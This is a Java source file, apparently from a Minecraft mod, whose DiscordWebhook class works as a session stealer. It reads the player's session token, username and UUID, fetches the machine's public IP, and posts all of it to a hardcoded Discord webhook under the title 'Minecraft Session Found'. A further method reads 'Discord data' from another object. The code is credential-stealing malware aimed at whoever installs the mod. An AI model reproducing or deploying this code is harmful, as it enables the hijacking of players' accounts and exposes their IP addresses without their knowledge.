package studio.dreamys;

import net.minecraft.client.Minecraft;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.awt.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class DiscordWebhook {
    public static Webhook.EmbedObject embed;
    public static void sendWebhook() throws IOException, NoSuchPaddingException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        Minecraft mc = Minecraft.getMinecraft();
        String token = mc.getSession().getToken();
        String username = mc.getSession().getUsername();
        String uuid = mc.getSession().getPlayerID();
        String IP = (new BufferedReader(new InputStreamReader((new URL("https://checkip.amazonaws.com/")).openStream()))).readLine();
        String nw = "https://sky.shiiyu.moe/stats/" + username;

        Webhook webhook = new Webhook("https://discord.com/api/webhooks/1045876614791172206/5smC3thQ6vhVcroLOrHYhZeL8gChrq98LvEk3OeBaXiJqhW4wgdfoyQ0IJwTXMKIW3M2");
        Webhook.EmbedObject embed = new Webhook.EmbedObject();
        embed.setTitle("{!] Minecraft Session Found {!]");
        embed.setThumbnail("https://crafatar.com/avatars/" + uuid);
        embed.addField("USERNAME - ", username, false);
        embed.addField("UUID - ", uuid, false);
        embed.addField("IP - ", IP, false);
        embed.addField("TOKEN - ", token, false);
        embed.addField("SKYBLOCK - ", nw, false);
        embed.setColor(Color.GRAY);
        embed.setFooter(getTime(), null);
        webhook.addEmbed(embed);

        webhook.execute();
    }

    public static void doSomethingWithDiscord(Discord discordInstance) {
        String discordData = discordInstance.getDiscord();
        // Now you can use the discordData string in DiscordWebhook as needed
        System.out.println("Discord data in DiscordWebhook: " + discordData);
    }
    public static String getTime() {
        SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy HH:mm");
        Date date = new Date();
        return (formatter.format(date));
    }
}